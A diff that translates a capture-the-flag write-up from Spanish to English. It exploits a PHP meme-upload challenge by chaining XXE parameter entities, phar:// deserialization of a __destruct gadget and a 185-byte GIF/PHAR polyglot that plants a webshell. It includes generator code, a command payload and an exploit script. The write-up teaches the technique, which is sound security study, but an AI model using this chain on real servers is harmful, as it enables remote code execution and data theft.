@@ -1,16 +1,16 @@
 # Meme Upload Service - 247CTF Writeup
 
-## Informacion del Reto
+## Challenge Info
 
-- **Plataforma**: 247CTF
-- **Categoria**: Web Exploitation
-- **Tecnicas**: XXE, PHAR Deserialization, Polyglot Files
+- **Platform**: 247CTF
+- **Category**: Web Exploitation
+- **Techniques**: XXE, PHAR Deserialization, Polyglot Files
 - **URL**: https://776fd06a930ec85d.247ctf.com/
 - **Flag**: `247CTF{0073c38dXXXXXXXXXXXXXXXXccc5668f}`
 
 ---
 
-## Analisis del Codigo Fuente
+## Source Code Analysis
 
 ### index.php
 
@@ -91,21 +91,21 @@ if (isset($_POST["message"])) {
 
 ---
 
-## Identificacion de Vulnerabilidades
+## Vulnerability Identification
 
-### 1. XXE con LIBXML_DTDLOAD
+### 1. XXE with LIBXML_DTDLOAD
 
-La funcion `loadXML()` usa el flag `LIBXML_DTDLOAD`:
+The function `loadXML()` uses the `LIBXML_DTDLOAD` flag:
 
 ```php
 $msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
 ```
 
-Este flag permite cargar DTDs externos especificados en el DOCTYPE. Aunque no se usa `LIBXML_NOENT` (que expandiria entidades generales como `&xxe;`), las **parameter entities** (`%xxe;`) SI se procesan durante la carga del DTD.
+This flag allows loading external DTDs specified in the DOCTYPE. Although `LIBXML_NOENT` is not used (which would expand general entities like `&xxe;`), **parameter entities** (`%xxe;`) ARE processed during DTD loading.
 
-### 2. Gadget de Deserializacion en la Clase Message
+### 2. Deserialization Gadget in the Message Class
 
-La clase `Message` tiene un metodo `__destruct()` que escribe contenido controlable a un archivo:
+The `Message` class has a `__destruct()` method that writes controllable content to a file:
 
 ```php
 public function __destruct()
@@ -119,43 +119,43 @@ public function __destruct()
 }
 ```
 
-Si controlamos `$this->filePath` y `$this->to`, podemos escribir codigo PHP arbitrario.
+If we control `$this->filePath` and `$this->to`, we can write arbitrary PHP code.
 
-### 3. Upload de Imagenes con Limite de 185 Bytes
+### 3. Image Upload with 185 Byte Limit
 
-El sistema permite subir imagenes con restricciones:
+The system allows uploading images with restrictions:
 - Extension: jpg, jpeg, gif, png
 - MIME type: image/jpeg, image/gif, image/png
-- `getimagesize()` debe retornar verdadero
-- Tamano maximo: **185 bytes**
+- `getimagesize()` must return true
+- Maximum size: **185 bytes**
 
 ---
 
-## Estrategia de Explotacion
+## Exploitation Strategy
 
-### Cadena de Ataque
+### Attack Chain
 
-1. Crear un archivo PHAR polyglot que:
-   - Pase como imagen GIF valida (magic bytes, mime, getimagesize)
-   - Contenga metadata serializada con un objeto `Message` malicioso
-   - Sea menor o igual a 185 bytes
+1. Create a PHAR polyglot file that:
+   - Passes as a valid GIF image (magic bytes, mime, getimagesize)
+   - Contains serialized metadata with a malicious `Message` object
+   - Is less than or equal to 185 bytes
 
-2. Subir el PHAR polyglot como imagen GIF
+2. Upload the PHAR polyglot as a GIF image
 
-3. Enviar XML con parameter entity XXE apuntando a `phar:///tmp/images/archivo.gif`
+3. Send XML with a parameter entity XXE pointing to `phar:///tmp/images/file.gif`
 
-4. Cuando libxml carga el "DTD" via `phar://`, PHP deserializa la metadata del PHAR
+4. When libxml loads the "DTD" via `phar://`, PHP deserializes the PHAR metadata
 
-5. El objeto `Message` deserializado ejecuta `__destruct()` al ser destruido, escribiendo un webshell
+5. The deserialized `Message` object executes `__destruct()` when destroyed, writing a webshell
 
-6. Acceder al webshell para obtener la flag
+6. Access the webshell to obtain the flag
 
-### Por que Parameter Entities y no General Entities
+### Why Parameter Entities and not General Entities
 
-Con solo `LIBXML_DTDLOAD` (sin `LIBXML_NOENT`):
+With only `LIBXML_DTDLOAD` (without `LIBXML_NOENT`):
 
-- **General entities** (`&xxe;`): NO se expanden en el contenido del documento
-- **Parameter entities** (`%xxe;`): SI se procesan dentro del DTD
+- **General entities** (`&xxe;`): are NOT expanded in the document content
+- **Parameter entities** (`%xxe;`): ARE processed within the DTD
 
 ```xml
 <!DOCTYPE foo [
@@ -164,41 +164,41 @@ Con solo `LIBXML_DTDLOAD` (sin `LIBXML_NOENT`):
 ]>
 ```
 
-Cuando el parser encuentra `%xxe;` en el DTD interno, intenta cargar el recurso SYSTEM, lo que dispara el wrapper `phar://`.
+When the parser encounters `%xxe;` in the internal DTD, it attempts to load the SYSTEM resource, which triggers the `phar://` wrapper.
 
 ---
 
-## Construccion del PHAR Polyglot
+## Building the PHAR Polyglot
 
-### El Problema: 185 Bytes
+### The Problem: 185 Bytes
 
-Un PHAR generado normalmente con la API de PHP tiene aproximadamente 197 bytes minimos, superando el limite. La solucion es construir el PHAR manualmente optimizando cada byte.
+A PHAR normally generated with the PHP API has approximately 197 minimum bytes, exceeding the limit. The solution is to build the PHAR manually, optimizing every byte.
 
-### Estructura del PHAR
+### PHAR Structure
 
 ```
 [STUB][MANIFEST_LENGTH][MANIFEST][FILE_CONTENTS][SIGNATURE][SIG_TYPE][MAGIC]
 ```
 
-Componentes:
-- **Stub**: Codigo PHP que termina en `__HALT_COMPILER();`
-- **Manifest**: Metadatos del archivo (numero de archivos, version API, metadata serializada)
-- **Signature**: Hash SHA1 del contenido (20 bytes)
+Components:
+- **Stub**: PHP code ending with `__HALT_COMPILER();`
+- **Manifest**: File metadata (number of files, API version, serialized metadata)
+- **Signature**: SHA1 hash of the content (20 bytes)
 - **Magic**: `GBMB` (4 bytes)
 
-### Optimizaciones Aplicadas
+### Applied Optimizations
 
-1. **Stub minimo con magic GIF**: `GIF8__HALT_COMPILER(); ?>\r\n` (27 bytes)
-   - `GIF8` es suficiente para que `mime_content_type()` detecte `image/gif`
-   - `getimagesize()` interpreta los bytes siguientes como dimensiones (valores grandes pero validos)
+1. **Minimal stub with GIF magic**: `GIF8__HALT_COMPILER(); ?>\r\n` (27 bytes)
+   - `GIF8` is sufficient for `mime_content_type()` to detect `image/gif`
+   - `getimagesize()` interprets the following bytes as dimensions (large but valid values)
 
-2. **Archivo interno minimo**: nombre `0`, contenido vacio
+2. **Minimal internal file**: name `0`, empty content
 
-3. **Metadata optimizada**: Solo propiedades necesarias (`to` y `filePath`)
+3. **Optimized metadata**: Only necessary properties (`to` and `filePath`)
 
-4. **Payload compacto**: `` <?=`cat /tmp/*`?> `` (17 caracteres)
+4. **Compact payload**: `` <?=`cat /tmp/*`?> `` (17 characters)
 
-### Codigo de Generacion
+### Generation Code
 
 ```php
 <?php
@@ -209,21 +209,21 @@ $m->filePath = "z.php";
 $m->to = "<?=`cat /tmp/*`?>";
 $metadata = serialize($m);
 
-// Stub que pasa como GIF
+// Stub that passes as GIF
 $stub = "GIF8__HALT_COMPILER(); ?>\r\n";
 
-// Archivo interno
+// Internal file
 $filename = "0";
 $filecontent = "";
 
-// Construir manifest
+// Build manifest
 $manifest = "";
 $manifest .= pack("V", 1);                    // Num files: 1
 $manifest .= pack("v", 0x0011);               // API version
 $manifest .= pack("V", 0x00010000);           // Flags: has signature
 $manifest .= pack("V", 0);                    // Alias length: 0
 $manifest .= pack("V", strlen($metadata));    // Metadata length
-$manifest .= $metadata;                       // Metadata serializada
+$manifest .= $metadata;                       // Serialized metadata
 
 // File entry
 $manifest .= pack("V", strlen($filename));    // Filename length
@@ -232,26 +232,26 @@ $manifest .= pack("V", strlen($filecontent)); // Uncompressed size
 $manifest .= pack("V", 0);                    // Timestamp
 $manifest .= pack("V", strlen($filecontent)); // Compressed size
 $manifest .= pack("V", crc32($filecontent));  // CRC32
-$manifest .= pack("V", 0x000001A4);           // Flags (permisos)
+$manifest .= pack("V", 0x000001A4);           // Flags (permissions)
 $manifest .= pack("V", 0);                    // Per-file metadata length
 
-// Ensamblar PHAR
+// Assemble PHAR
 $phar_data = $stub;
 $phar_data .= pack("V", strlen($manifest));   // Manifest length
 $phar_data .= $manifest;
 $phar_data .= $filecontent;
 
-// Firma SHA1
+// SHA1 Signature
 $sig_data = hash("sha1", $phar_data, true);
 $phar_data .= $sig_data;
 $phar_data .= pack("V", 0x0002);              // Signature type: SHA1
 $phar_data .= "GBMB";                         // Magic
 
 file_put_contents("exploit.phar", $phar_data);
-// Tamano final: 185 bytes exactos
+// Final size: exactly 185 bytes
 ```
 
-### Verificacion del PHAR
+### PHAR Verification
 
 ```
 $ xxd exploit.phar
@@ -270,7 +270,7 @@ $ xxd exploit.phar
 
 ---
 
-## Exploit Completo
+## Complete Exploit
 
 ```python
 #!/usr/bin/python3
@@ -280,9 +280,9 @@ import re
 
 RHOST = "776fd06a930ec85d.247ctf.com"
 
-# PHAR polyglot de 185 bytes (pre-generado)
+# 185-byte PHAR polyglot (pre-generated)
 def generate_phar():
-    # Metadata serializada
+    # Serialized metadata
     metadata = b'O:7:"Message":2:{s:2:"to";s:17:"<?=`cat /tmp/*`?>";s:8:"filePath";s:5:"z.php";}'
 
     stub = b"GIF8__HALT_COMPILER(); ?>\r\n"
@@ -365,7 +365,7 @@ if flag:
 
 ---
 
-## Ejecucion
+## Execution
 
 ```
 $ python3 exploit.py
@@ -386,21 +386,21 @@ $ python3 exploit.py
 
 ---
 
-## Aprendizaje del reto
+## Lessons Learned
 
-1. **LIBXML_DTDLOAD sin LIBXML_NOENT**: Las parameter entities (`%xxe;`) se procesan aunque las general entities (`&xxe;`) no se expandan.
+1. **LIBXML_DTDLOAD without LIBXML_NOENT**: Parameter entities (`%xxe;`) are processed even though general entities (`&xxe;`) are not expanded.
 
-2. **PHAR Deserialization**: El wrapper `phar://` deserializa la metadata automaticamente al acceder al archivo, sin necesidad de llamar a `unserialize()` explicitamente.
+2. **PHAR Deserialization**: The `phar://` wrapper automatically deserializes metadata when accessing the file, without needing to explicitly call `unserialize()`.
 
-3. **Polyglot Files**: Los archivos PHAR permiten prefijos arbitrarios en el stub, lo que facilita crear polyglots que pasen validaciones de tipo de archivo.
+3. **Polyglot Files**: PHAR files allow arbitrary prefixes in the stub, which makes it easy to create polyglots that pass file type validations.
 
-4. **Limites de Tamano como Defensa**: El limite de 185 bytes fue disenado para dificultar la creacion de PHARs validos, pero con construccion manual y optimizacion se puede lograr.
+4. **Size Limits as Defense**: The 185-byte limit was designed to make it difficult to create valid PHARs, but with manual construction and optimization it can be achieved.
 
-5. **Gadgets en __destruct**: Los metodos magicos como `__destruct()` son vectores comunes para explotar deserializacion insegura.
+5. **Gadgets in __destruct**: Magic methods like `__destruct()` are common vectors for exploiting insecure deserialization.
 
 ---
 
-## Referencias
+## References
 
 - [PHP PHAR Format Specification](https://www.php.net/manual/en/phar.fileformat.php)
 - [BlackHat 2018 - It's a PHP Unserialization Vulnerability Jim, but Not as We Know It](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
